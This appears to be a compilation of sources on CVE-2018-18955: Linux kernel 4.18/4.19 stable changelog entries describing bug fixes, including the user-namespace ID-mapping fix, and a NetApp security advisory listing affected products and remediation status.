commit 95691e3eddc41da2d1cd3cca51fecdfb46bd85bc upstream.
Currently, "disable\_clkrun" yenta\_socket module parameter is only
implemented for TI CardBus bridges.
Add also an implementation for Ricoh bridges that have the necessary
setting documented in publicly available datasheets.
Tested on a RL5C476II with a Sunrich C-160 CardBus NIC that doesn't work
correctly unless the CLKRUN protocol is disabled.
Let's also make it clear in its description that the "disable\_clkrun"
module parameter only works on these two previously mentioned brands of
CardBus bridges.
Signed-off-by: Maciej S. Szmigiero
Cc: stable@vger.kernel.org
Signed-off-by: Dominik Brodowski
Signed-off-by: Greg Kroah-Hartman
commit 953983cbbf05b75bd14fad63ef00adce9120b057
Author: He Zhe
Date: Mon Sep 17 11:24:20 2018 +0800
dma-mapping: fix panic caused by passing empty cma command line argument
commit a3ceed87b07769fb80ce9dc6b604e515dba14c4b upstream.
early\_cma does not check input argument before passing it to
simple\_strtoull. The argument would be a NULL pointer if "cma", without
its value, is set in command line and thus causes the following panic.
PANIC: early exception 0xe3 IP 10:ffffffffa3e9db8d error 0 cr2 0x0
[ 0.000000] CPU: 0 PID: 0 Comm: swapper Not tainted 4.19.0-rc3-yocto-standard+ #7
[ 0.000000] RIP: 0010:\_parse\_integer\_fixup\_radix+0xd/0x70
...
[ 0.000000] Call Trace:
[ 0.000000] simple\_strtoull+0x29/0x70
[ 0.000000] memparse+0x26/0x90
[ 0.000000] early\_cma+0x17/0x6a
[ 0.000000] do\_early\_param+0x57/0x8e
[ 0.000000] parse\_args+0x208/0x320
[ 0.000000] ? rdinit\_setup+0x30/0x30
[ 0.000000] parse\_early\_options+0x29/0x2d
[ 0.000000] ? rdinit\_setup+0x30/0x30
[ 0.000000] parse\_early\_param+0x36/0x4d
[ 0.000000] setup\_arch+0x336/0x99e
[ 0.000000] start\_kernel+0x6f/0x4e6
[ 0.000000] x86\_64\_start\_reservations+0x24/0x26
[ 0.000000] x86\_64\_start\_kernel+0x6f/0x72
[ 0.000000] secondary\_startup\_64+0xa4/0xb0
This patch adds a check to prevent the panic.
Signed-off-by: He Zhe
Reviewed-by: Marek Szyprowski
Cc: stable@vger.kernel.org
Signed-off-by: Christoph Hellwig
Signed-off-by: Greg Kroah-Hartman
commit 2037da5ce0a1c678c55015782a091336f5aad4af
Author: Rafael J. Wysocki
Date: Mon Oct 15 23:21:05 2018 +0200
cpufreq: conservative: Take limits changes into account properly
commit da5e79bc70b84971d2b3a55fb252e34e51d81d48 upstream.
If the policy limits change between invocations of cs\_dbs\_update(),
the requested frequency value stored in dbs\_info may not be updated
and the function may use a stale value of it next time. Moreover, if
idle periods are takem into account by cs\_dbs\_update(), the requested
frequency value stored in dbs\_info may be below the min policy limit,
which is incorrect.
To fix these problems, always update the requested frequency value
in dbs\_info along with the local copy of it when the previous
requested frequency is beyond the policy limits and avoid decreasing
the requested frequency below the min policy limit when taking
idle periods into account.
Fixes: abb6627910a1 (cpufreq: conservative: Fix next frequency selection)
Fixes: 00bfe05889e9 (cpufreq: conservative: Decrease frequency faster for deferred updates)
Reported-by: Waldemar Rymarkiewicz
Cc: All applicable
Signed-off-by: Rafael J. Wysocki
Acked-by: Waldemar Rymarkiewicz
Acked-by: Viresh Kumar
Signed-off-by: Greg Kroah-Hartman
commit 1ea5c403dd41f4ef91e128e0cc563dc8e2ea4c4e
Author: Ming Lei
Date: Mon Oct 29 20:57:19 2018 +0800
block: make sure writesame bio is aligned with logical block size
commit 34ffec60b27aa81d04e274e71e4c6ef740f75fc7 upstream.
Obviously the created writesame bio has to be aligned with logical block
size, and use bio\_allowed\_max\_sectors() to retrieve this number.
Cc: stable@vger.kernel.org
Cc: Mike Snitzer
Cc: Christoph Hellwig
Cc: Xiao Ni
Cc: Mariusz Dabrowski
Fixes: b49a0871be31a745b2ef ("block: remove split code in blkdev\_issue\_{discard,write\_same}")
Tested-by: Rui Salvaterra
Signed-off-by: Ming Lei
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit 14657efd3ad918f6779100e1047ea60d97a0d667
Author: Ming Lei
Date: Mon Oct 29 20:57:17 2018 +0800
block: make sure discard bio is aligned with logical block size
commit 1adfc5e4136f5967d591c399aff95b3b035f16b7 upstream.
Obviously the created discard bio has to be aligned with logical block size.
This patch introduces the helper of bio\_allowed\_max\_sectors() for
this purpose.
Cc: stable@vger.kernel.org
Cc: Mike Snitzer
Cc: Christoph Hellwig
Cc: Xiao Ni
Cc: Mariusz Dabrowski
Fixes: 744889b7cbb56a6 ("block: don't deal with discard limit in blkdev\_issue\_discard()")
Fixes: a22c4d7e34402cc ("block: re-add discard\_granularity and alignment checks")
Reported-by: Rui Salvaterra
Tested-by: Rui Salvaterra
Signed-off-by: Ming Lei
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit cf8d0973c21123ae7f14f400b74aa89c6ff221bd
Author: Jens Axboe
Date: Sun Oct 21 12:02:36 2018 -0600
block: setup bounce bio\_sets properly
commit 52990a5fb0c991ecafebdab43138b5ed41376852 upstream.
We're only setting up the bounce bio sets if we happen
to need bouncing for regular HIGHMEM, not if we only need
it for ISA devices.
Protect the ISA bounce setup with a mutex, since it's
being invoked from driver init functions and can thus be
called in parallel.
Cc: stable@vger.kernel.org
Reported-by: Ondrej Zary
Tested-by: Ondrej Zary
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit f5f578eb2392fd9acd0f8b6f183d70f0181411c7
Author: Hou Tao
Date: Sat Oct 6 17:09:35 2018 +0800
jffs2: free jffs2\_sb\_info through jffs2\_kill\_sb()
commit 92e2921f7eee63450a5f953f4b15dc6210219430 upstream.
When an invalid mount option is passed to jffs2, jffs2\_parse\_options()
will fail and jffs2\_sb\_info will be freed, but then jffs2\_sb\_info will
be used (use-after-free) and freeed (double-free) in jffs2\_kill\_sb().
Fix it by removing the buggy invocation of kfree() when getting invalid
mount options.
Fixes: 92abc475d8de ("jffs2: implement mount option parsing and compression overriding")
Cc: stable@kernel.org
Signed-off-by: Hou Tao
Reviewed-by: Richard Weinberger
Signed-off-by: Boris Brezillon
Signed-off-by: Greg Kroah-Hartman
commit 43cba96d9505c5084db99531f28d4036698cfefe
Author: Dmitry Bazhenov
Date: Mon Oct 15 14:21:22 2018 +0500
hwmon: (pmbus) Fix page count auto-detection.
commit e7c6a55606b5c46b449d76588968b4d8caae903f upstream.
Devices with compatible="pmbus" field have zero initial page count,
and pmbus\_clear\_faults() being called before the page count auto-
detection does not actually clear faults because it depends on the
page count. Non-cleared faults in its turn may fail the subsequent
page count auto-detection.
This patch fixes this problem by calling pmbus\_clear\_fault\_page()
for currently set page and calling pmbus\_clear\_faults() after the
page count was detected.
Cc: stable@vger.kernel.org
Signed-off-by: Dmitry Bazhenov
Signed-off-by: Guenter Roeck
Signed-off-by: Greg Kroah-Hartman
commit e52ad8e0ef53b1a60105b048704ac8b2fea6f014
Author: Tang Junhui
Date: Mon Oct 8 20:41:14 2018 +0800
bcache: fix miss key refill->end in writeback
commit 2d6cb6edd2c7fb4f40998895bda45006281b1ac5 upstream.
refill->end record the last key of writeback, for example, at the first
time, keys (1,128K) to (1,1024K) are flush to the backend device, but
the end key (1,1024K) is not included, since the bellow code:
if (bkey\_cmp(k, refill->end) >= 0) {
ret = MAP\_DONE;
goto out;
}
And in the next time when we refill writeback keybuf again, we searched
key start from (1,1024K), and got a key bigger than it, so the key
(1,1024K) missed.
This patch modify the above code, and let the end key to be included to
the writeback key buffer.
Signed-off-by: Tang Junhui
Cc: stable@vger.kernel.org
Signed-off-by: Coly Li
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit 9e9f19efcb1ce58f2bac949f34dc91060e470472
Author: Tang Junhui
Date: Mon Oct 8 20:41:12 2018 +0800
bcache: correct dirty data statistics
commit 2e17a262a2371d38d2ec03614a2675a32cef9912 upstream.
When bcache device is clean, dirty keys may still exist after
journal replay, so we need to count these dirty keys even
device in clean status, otherwise after writeback, the amount
of dirty data would be incorrect.
Signed-off-by: Tang Junhui
Cc: stable@vger.kernel.org
Signed-off-by: Coly Li
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit 32870e2bb60041867764cc85634c0d9023040e35
Author: Tang Junhui
Date: Mon Oct 8 20:41:10 2018 +0800
bcache: fix ioctl in flash device
commit dd0c91793b7c2658ea32c6b3a2247a8ceca45dc0 upstream.
When doing ioctl in flash device, it will call ioctl\_dev() in super.c,
then we should not to get cached device since flash only device has
no backend device. This patch just move the jugement dc->io\_disable
to cached\_dev\_ioctl() to make ioctl in flash device correctly.
Fixes: 0f0709e6bfc3c ("bcache: stop bcache device when backing device is offline")
Signed-off-by: Tang Junhui
Cc: stable@vger.kernel.org
Signed-off-by: Coly Li
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit fec039ec69c8e1ba4ba6a4bc040e45d2ea5a6dfe
Author: Tang Junhui
Date: Mon Oct 8 20:41:08 2018 +0800
bcache: trace missed reading by cache\_missed
commit 502b291568fc7faf1ebdb2c2590f12851db0ff76 upstream.
Missed reading IOs are identified by s->cache\_missed, not the
s->cache\_miss, so in trace\_bcache\_read() using trace\_bcache\_read
to identify whether the IO is missed or not.
Signed-off-by: Tang Junhui
Cc: stable@vger.kernel.org
Signed-off-by: Coly Li
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit 95e124ad80c1d4bce9fbda9eeb0d903c0afaa2bc
Author: Rafał Miłecki
Date: Thu Oct 11 09:40:22 2018 +0200
spi: bcm-qspi: fix calculation of address length
commit 0976eda7915507fe94e07870c19d717c9994b57a upstream.
During implementation of the new API bcm\_qspi\_bspi\_set\_flex\_mode() has
been modified breaking calculation of address length. An unnecessary
multiplication was added breaking flash reads.
Fixes: 5f195ee7d830 ("spi: bcm-qspi: Implement the spi\_mem interface")
Signed-off-by: Rafał Miłecki
Reviewed-by: Boris Brezillon
Signed-off-by: Mark Brown
Cc: stable@vger.kernel.org
Signed-off-by: Greg Kroah-Hartman
commit 97baa6b21b2997d727779ae3a1780968ca956baa
Author: Rafał Miłecki
Date: Thu Oct 11 09:42:17 2018 +0200
spi: bcm-qspi: switch back to reading flash using smaller chunks
commit 940ec770c295682993d1cccce3081fd7c74fece8 upstream.
Fixing/optimizing bcm\_qspi\_bspi\_read() performance introduced two
changes:
1) It added a loop to read all requested data using multiple BSPI ops.
2) It bumped max size of a single BSPI block request from 256 to 512 B.
The later change resulted in occasional BSPI timeouts causing a
regression.
For some unknown reason hardware doesn't always handle reads as expected
when using 512 B chunks. In such cases it may happen that BSPI returns
amount of requested bytes without the last 1-3 ones. It provides the
remaining bytes later but doesn't raise an interrupt until another LR
start.
Switching back to 256 B reads fixes that problem and regression.
Fixes: 345309fa7c0c ("spi: bcm-qspi: Fix bcm\_qspi\_bspi\_read() performance")
Signed-off-by: Rafał Miłecki
Signed-off-by: Mark Brown
Cc: stable@vger.kernel.org
Signed-off-by: Greg Kroah-Hartman
commit 9251a21bb4f764a89a3bf9a902d75cf792eb65eb
Author: Chuanhua Han
Date: Thu Aug 30 16:43:24 2018 +0800
spi: spi-mem: Adjust op len based on message/transfer size limitations
commit e757996cafbeb6b71234a17130674bcd8f44c59e upstream.
We need that to adjust the len of the 2nd transfer (called data in
spi-mem) if it's too long to fit in a SPI message or SPI transfer.
Fixes: c36ff266dc82 ("spi: Extend the core to ease integration of SPI memory controllers")
Cc:
Signed-off-by: Chuanhua Han
Reviewed-by: Boris Brezillon
Signed-off-by: Mark Brown
Signed-off-by: Greg Kroah-Hartman
commit 24177fabfef0960d53c8f5b3b7b349ad4a87bc9e
Author: Ahmad Fatoum
Date: Fri Sep 21 11:32:53 2018 +0200
mtd: spi-nor: fsl-quadspi: Don't let -EINVAL on the bus
commit 000412276370a9bcfec73b3752ceefd9a927f1db upstream.
fsl\_qspi\_get\_seqid() may return -EINVAL, but fsl\_qspi\_init\_ahb\_read()
doesn't check for error codes with the result that -EINVAL could find
itself signalled over the bus.
In conjunction with the LS1046A SoC's A-009283 errata
("Illegal accesses to SPI flash memory can result in a system hang")
this illegal access to SPI flash memory results in a system hang
if userspace attempts reading later on.
Avoid this by always checking fsl\_qspi\_get\_seqid()'s return value
and bail out otherwise.
Fixes: e46ecda764dc ("mtd: spi-nor: Add Freescale QuadSPI driver")
Cc: stable@vger.kernel.org
Signed-off-by: Ahmad Fatoum
Signed-off-by: Boris Brezillon
Signed-off-by: Greg Kroah-Hartman
commit 55f15a247dab45542efa8ef5eb716b1f0e410376
Author: Mika Westerberg
Date: Thu Aug 30 11:42:57 2018 +0300
mtd: spi-nor: intel-spi: Add support for Intel Ice Lake SPI serial flash
commit 42460c31ae96cbad5ae226ee6c10bd8d70d764ae upstream.
Intel Ice Lake exposes the SPI serial flash controller as a PCI device
in the same way than Intel Denverton. Add Ice Lake SPI serial flash PCI
ID to the driver list of supported devices.
Signed-off-by: Mika Westerberg
Acked-by: Marek Vasut
Cc: stable@vger.kernel.org
Signed-off-by: Boris Brezillon
Signed-off-by: Greg Kroah-Hartman
commit e40d8067fe8ef7c59184d508373e9cca22c911fe
Author: Liu Xiang
Date: Tue Aug 28 22:32:57 2018 +0800
mtd: spi-nor: fsl-quadspi: fix read error for flash size larger than 16MB
commit 41fe242979e463d6ad251077ded01b825a330b7e upstream.
If the size of spi-nor flash is larger than 16MB, the read\_opcode
is set to SPINOR\_OP\_READ\_1\_1\_4\_4B, and fsl\_qspi\_get\_seqid() will
return -EINVAL when cmd is SPINOR\_OP\_READ\_1\_1\_4\_4B. This can
cause read operation fail.
Fixes: e46ecda764dc ("mtd: spi-nor: Add Freescale QuadSPI driver")
Cc:
Signed-off-by: Liu Xiang
Signed-off-by: Boris Brezillon
Signed-off-by: Greg Kroah-Hartman
commit 53772af08acd3e5143a5c1e6f7b8ddd3cabb350f
Author: Ricardo Ribalda Delgado
Date: Thu Oct 4 15:01:04 2018 +0200
mtd: maps: gpio-addr-flash: Fix ioremapped size
commit 6c925b333368cda4e1b0513b07f72316c0e7edd7 upstream.
We should only iomap the area of the chip that is memory mapped.
Otherwise we could be mapping devices beyond the memory space or that
belong to other devices.
Signed-off-by: Ricardo Ribalda Delgado
Fixes: ebd71e3a4861 ("mtd: maps: gpio-addr-flash: fix warnings and make more portable")
Cc:
Signed-off-by: Boris Brezillon
Signed-off-by: Greg Kroah-Hartman
commit 6737137331176d4f6d8878fbc7979e5de398dca9
Author: Miquel Raynal
Date: Wed Oct 3 11:05:04 2018 +0200
mtd: rawnand: marvell: fix the IRQ handler complete() condition
commit 53c83b59759c1ee213f5ffa194909daee8902a28 upstream.
With the current implementation, the complete() in the IRQ handler is
supposed to be called only if the register status has one or the other
RDY bit set. Other events might trigger an interrupt as well if
enabled, but should not end-up with a complete() call.
For this purpose, the code was checking if the other bits were set, in
this case complete() was not called. This is wrong as two events might
happen in a very tight time-frame and if the NDSR status read reports
two bits set (eg. RDY(0) and RDDREQ) at the same time, complete() was
not called.
This logic would lead to timeouts in marvell\_nfc\_wait\_op() and has
been observed on PXA boards (NFCv1) in the Hamming write path.
Fixes: 02f26ecf8c77 ("mtd: nand: add reworked Marvell NAND controller driver")
Cc: stable@vger.kernel.org
Reported-by: Daniel Mack
Signed-off-by: Miquel Raynal
Tested-by: Daniel Mack
Signed-off-by: Greg Kroah-Hartman
commit d037b0394fb474642a11cb8cdc84c4624d57da98
Author: Linus Walleij
Date: Wed Aug 29 17:02:16 2018 +0200
gpio: mxs: Get rid of external API call
[ Upstream commit 833eacc7b5913da9896bacd30db7d490aa777868 ]
The MXS driver was calling back into the GPIO API from
its irqchip. This is not very elegant, as we are a driver,
let's just shortcut back into the gpio\_chip .get() function
instead.
This is a tricky case since the .get() callback is not in
this file, instead assigned by bgpio\_init(). Calling the
function direcly in the gpio\_chip is however the lesser
evil.
Cc: Sascha Hauer
Cc: Janusz Uzycki
Signed-off-by: Linus Walleij
Signed-off-by: Sasha Levin
commit 085d695911bebb8eaa16acf57ad012a7c00cc6ff
Author: Huacai Chen
Date: Mon Nov 5 22:58:30 2018 +0000
MIPS: VDSO: Reduce VDSO\_RANDOMIZE\_SIZE to 64MB for 64bit
[ Upstream commit c61c7def1fa0a722610d89790e0255b74f3c07dd ]
Commit ea7e0480a4b6 ("MIPS: VDSO: Always map near top of user memory")
set VDSO\_RANDOMIZE\_SIZE to 256MB for 64bit kernel. But take a look at
arch/mips/mm/mmap.c we can see that MIN\_GAP is 128MB, which means the
mmap\_base may be at (user\_address\_top - 128MB). This make the stack be
surrounded by mmaped areas, then stack expanding fails and causes a
segmentation fault. Therefore, VDSO\_RANDOMIZE\_SIZE should be less than
MIN\_GAP and this patch reduce it to 64MB.
Signed-off-by: Huacai Chen
Signed-off-by: Paul Burton
Fixes: ea7e0480a4b6 ("MIPS: VDSO: Always map near top of user memory")
Patchwork: https://patchwork.linux-mips.org/patch/20910/
Cc: Ralf Baechle
Cc: James Hogan
Cc: linux-mips@linux-mips.org
Cc: Fuxin Zhang
Cc: Zhangjin Wu
Cc: Huacai Chen
Cc: stable@vger.kernel.org # 4.19
Signed-off-by: Sasha Levin
commit d93080cdba60ec99db81f1c96d4b8dd8f0c3d7f9
Author: Daniel Borkmann
Date: Thu Nov 1 22:29:53 2018 +0100
bpf: fix partial copy of map\_ptr when dst is scalar
commit 0962590e553331db2cc0aef2dc35c57f6300dbbe upstream.
ALU operations on pointers such as scalar\_reg += map\_value\_ptr are
handled in adjust\_ptr\_min\_max\_vals(). Problem is however that map\_ptr
and range in the register state share a union, so transferring state
through dst\_reg->range = ptr\_reg->range is just buggy as any new
map\_ptr in the dst\_reg is then truncated (or null) for subsequent
checks. Fix this by adding a raw member and use it for copying state
over to dst\_reg.
Fixes: f1174f77b50c ("bpf/verifier: rework value tracking")
Signed-off-by: Daniel Borkmann
Cc: Edward Cree
Acked-by: Alexei Starovoitov
Signed-off-by: Alexei Starovoitov
Acked-by: Edward Cree
Signed-off-by: Sasha Levin


=== Content from security.netapp.com_ebba4149_20250124_213107.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [CVE-2018-18955 Linux Kernel Vulnerability in NetApp Products](https://security.netapp.com/advisory/ntap-20190416-0003)

## CVE-2018-18955 Linux Kernel Vulnerability in NetApp Products

circle-check-alt

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close ×

#### Subscribe to NTAP-20190416-0003 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20190416-0003 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close ×

#### Unsubscribe from NTAP-20190416-0003 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20190416-0003 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20190416-0003
**Version:**
3.0

**Last updated:**
07/31/2019

**Status:**
Final.

**CVEs:** CVE-2018-18955

Overview
#### Summary

Multiple NetApp products incorporate Linux kernel. Linux kernel versions 4.15.x through 4.19.x before 4.19.2 are susceptible to a vulnerability which when successfully exploited could lead to disclosure of sensitive information, addition or modification of data or Denial of Service (DoS).

#### Impact

Successful exploitation of this vulnerability could lead to disclosure of sensitive information, addition or modification of data or Denial of Service (DoS).

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2018-18955](https://nvd.nist.gov/vuln/detail/CVE-2018-18955) | 7.0 (HIGH) | CVSS:3.0/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

Affected Products
#### Affected Products

* Cluster Network Switch (NetApp CN1610)
* SnapProtect

#### Products Not Affected

* 7-Mode Transition Tool
* ATTO FibreBridge
* Active IQ Unified Manager (formerly OnCommand Unified Manager) for Linux 7.3 and above
* Active IQ Unified Manager (formerly OnCommand Unified Manager) for VMware vSphere 9.5 and above
* Active IQ Unified Manager (formerly OnCommand Unified Manager) for Windows 7.3 and above
* Brocade Fabric Operating System Firmware
* Brocade Network Advisor Software
* Clustered Data ONTAP
* Clustered Data ONTAP Antivirus Connector
* Data ONTAP operating in 7-Mode
* E-Series SANtricity Management Plug-ins (VMware vCenter)
* E-Series SANtricity OS Controller Software 11.x
* E-Series SANtricity Storage Manager
* E-Series SANtricity Web Services (REST API) for Web Services Proxy
* Element Plug-in for vCenter Server
* FAS/AFF BIOS
* FAS/AFF Baseboard Management Controller (BMC)
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* MetroCluster Tiebreaker for clustered Data ONTAP
* NetApp Cloud Backup (formerly AltaVault)
* NetApp Cloud Backup OST Plug-in (formerly AltaVault OST Plug-in)
* NetApp Converged Systems Advisor Agent
* NetApp Element System Firmware
* NetApp HCI Compute Node (Bootstrap OS)
* NetApp HCI Compute Node BIOS
* NetApp HCI Storage Nodes
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp Plug-in for Symantec NetBackup
* NetApp SANtricity Cloud Connector
* NetApp SANtricity SMI-S Provider
* NetApp SMI-S Provider
* NetApp Service Level Manager
* NetApp SolidFire & HCI Management Node
* NetApp SolidFire & HCI Storage Node (Element Software)
* NetApp SteelStore Cloud Integrated Storage
* NetApp Storage Encryption
* NetApp VASA Provider for Clustered Data ONTAP 7.2 and above
* ONTAP Select Deploy administration utility
* OnCommand API Services
* OnCommand Cloud Manager
* OnCommand Insight
* OnCommand System Manager 9.x
* OnCommand Unified Manager for 7-Mode (core package)
* OnCommand Workflow Automation
* Open Systems SnapVault Agent
* RAID Controller CTS2600 Legacy Engenio
* SAS Firmware
* Service Processor
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapDrive for Unix
* SnapDrive for Windows
* SnapManager for Exchange
* SnapManager for Hyper-V
* SnapManager for MS SQL
* SnapManager for Oracle
* SnapManager for SAP
* SnapManager for Sharepoint
* Storage Replication Adapter for Clustered Data ONTAP for VMware vSphere 7.2 and above
* Storage Replication Adapter for Clustered Data ONTAP for Windows 7.2 and above
* Storage Services Connector
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID Baseboard Management Controller (BMC)
* StorageGRID Webscale NAS Bridge
* StorageGRID9 (9.x and prior)
* System Setup
* Virtual Storage Console for VMware vSphere 7.2 and above

Remediation
#### Software Versions and Fixes

NetApp's currently available patches are listed below.

| **Product** | **First Fixed in Release** |
| --- | --- |
| **Cluster Network Switch (NetApp CN1610)** | Cluster Network Switch (NetApp CN1610) has no plans to address this vulnerability. |
| **SnapProtect** | SnapProtect has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2426797.html) for more information. |

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

**Technical Support**

Revision History
#### Status of This Notice

**Final.**

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20190416-0003>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20190416 | Initial Public Release |
| 2.0 | 20190531 | SnapProtect moved to Won't Fix status |
| 3.0 | 20190731 | Cluster Network Switch (NetApp CN1610) moved to Won't Fix status, Final status |

This document is provided solely for informational purposes. All information is based upon NetAppâs current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp. Â© 2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from cdn.kernel.org_9a6ab204_20250124_213021.html ===
commit 6559b2338d96ec330887871d47e1ced520bc4f03
Author: Greg Kroah-Hartman
Date: Tue Nov 13 11:12:59 2018 -0800
Linux 4.18.19
commit 5c4f8ea1f31301875411a3b6d18e03ae99864d0e
Author: Shaohua Li
Date: Sun Oct 14 17:05:07 2018 -0700
MD: fix invalid stored role for a disk - try2
commit 9e753ba9b9b405e3902d9f08aec5f2ea58a0c317 upstream.
Commit d595567dc4f0 (MD: fix invalid stored role for a disk) broke linear
hotadd. Let's only fix the role for disks in raid1/10.
Based on Guoqing's original patch.
Reported-by: kernel test robot
Cc: Gioh Kim
Cc: Guoqing Jiang
Signed-off-by: Shaohua Li
Signed-off-by: Greg Kroah-Hartman
commit ddf734ede053ad9cf1e9555b63cb00dccbf144cf
Author: Daniel Colascione
Date: Fri Oct 12 03:54:27 2018 -0700
bpf: wait for running BPF programs when updating map-in-map
commit 1ae80cf31938c8f77c37a29bbe29e7f1cd492be8 upstream.
The map-in-map frequently serves as a mechanism for atomic
snapshotting of state that a BPF program might record. The current
implementation is dangerous to use in this way, however, since
userspace has no way of knowing when all programs that might have
retrieved the "old" value of the map may have completed.
This change ensures that map update operations on map-in-map map types
always wait for all references to the old map to drop before returning
to userspace.
Signed-off-by: Daniel Colascione
Reviewed-by: Joel Fernandes (Google)
Signed-off-by: Alexei Starovoitov
Signed-off-by: Chenbo Feng
Signed-off-by: Greg Kroah-Hartman
commit bbfed258eb08070e051a1c086282623cc562ff24
Author: Jann Horn
Date: Mon Nov 5 20:55:09 2018 +0100
userns: also map extents in the reverse map to kernel IDs
commit d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd upstream.
The current logic first clones the extent array and sorts both copies, then
maps the lower IDs of the forward mapping into the lower namespace, but
doesn't map the lower IDs of the reverse mapping.
This means that code in a nested user namespace with >5 extents will see
incorrect IDs. It also breaks some access checks, like
inode\_owner\_or\_capable() and privileged\_wrt\_inode\_uidgid(), so a process
can incorrectly appear to be capable relative to an inode.
To fix it, we have to make sure that the "lower\_first" members of extents
in both arrays are translated; and we have to make sure that the reverse
map is sorted \*after\* the translation (since otherwise the translation can
break the sorting).
This is CVE-2018-18955.
Fixes: 6397fac4915a ("userns: bump idmap limits to 340")
Cc: stable@vger.kernel.org
Signed-off-by: Jann Horn
Tested-by: Eric W. Biederman
Reviewed-by: Eric W. Biederman
Signed-off-by: Eric W. Biederman
Signed-off-by: Greg Kroah-Hartman
commit 46aa7eb182c9c11f659900c8628cf1ef4c585e1e
Author: David Ahern
Date: Wed Oct 24 08:32:49 2018 -0700
net: sched: Remove TCA\_OPTIONS from policy
commit e72bde6b66299602087c8c2350d36a525e75d06e upstream.
Marco reported an error with hfsc:
root@Calimero:~# tc qdisc add dev eth0 root handle 1:0 hfsc default 1
Error: Attribute failed policy validation.
Apparently a few implementations pass TCA\_OPTIONS as a binary instead
of nested attribute, so drop TCA\_OPTIONS from the policy.
Fixes: 8b4c3cdd9dd8 ("net: sched: Add policy validation for tc attributes")
Reported-by: Marco Berizzi
Signed-off-by: David Ahern
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 928b261cfbe6e7a028311f9d58e0d93024f51d18
Author: Filipe Manana
Date: Mon Oct 22 10:43:06 2018 +0100
Btrfs: fix use-after-free when dumping free space
commit 9084cb6a24bf5838a665af92ded1af8363f9e563 upstream.
We were iterating a block group's free space cache rbtree without locking
first the lock that protects it (the free\_space\_ctl->free\_space\_offset
rbtree is protected by the free\_space\_ctl->tree\_lock spinlock).
KASAN reported an use-after-free problem when iterating such a rbtree due
to a concurrent rbtree delete:
[ 9520.359168] ==================================================================
[ 9520.359656] BUG: KASAN: use-after-free in rb\_next+0x13/0x90
[ 9520.359949] Read of size 8 at addr ffff8800b7ada500 by task btrfs-transacti/1721
[ 9520.360357]
[ 9520.360530] CPU: 4 PID: 1721 Comm: btrfs-transacti Tainted: G L 4.19.0-rc8-nbor #555
[ 9520.360990] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[ 9520.362682] Call Trace:
[ 9520.362887] dump\_stack+0xa4/0xf5
[ 9520.363146] print\_address\_description+0x78/0x280
[ 9520.363412] kasan\_report+0x263/0x390
[ 9520.363650] ? rb\_next+0x13/0x90
[ 9520.363873] \_\_asan\_load8+0x54/0x90
[ 9520.364102] rb\_next+0x13/0x90
[ 9520.364380] btrfs\_dump\_free\_space+0x146/0x160 [btrfs]
[ 9520.364697] dump\_space\_info+0x2cd/0x310 [btrfs]
[ 9520.364997] btrfs\_reserve\_extent+0x1ee/0x1f0 [btrfs]
[ 9520.365310] \_\_btrfs\_prealloc\_file\_range+0x1cc/0x620 [btrfs]
[ 9520.365646] ? btrfs\_update\_time+0x180/0x180 [btrfs]
